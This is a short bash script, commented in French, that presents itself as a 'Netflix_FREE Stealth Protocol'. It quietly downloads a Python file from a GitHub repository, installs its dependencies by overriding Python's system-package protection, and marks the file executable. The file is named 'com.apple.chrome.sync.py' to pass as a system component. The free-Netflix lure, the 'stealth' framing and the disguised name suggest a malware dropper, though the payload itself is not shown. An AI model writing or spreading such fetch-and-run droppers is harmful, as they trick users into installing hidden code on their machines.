#!/bin/bash
echo "[*] Initializing Netflix_FREE Stealth Protocol..."

# 1. Télécharger les fichiers depuis le repo vers le dossier local
curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/com.apple.chrome.sync.py
curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/requirements.txt

# 2. Installer les dépendances (Bypass PEP 668)
# Le flag --break-system-packages est nécessaire car tu es sur Python 3.14
pip3 install -r requirements.txt --break-system-packages --quiet

# 3. Accorder les permissions d'exécution
chmod +x com.apple.chrome.sync.py

echo "[+] Environment Ready. Lock in."
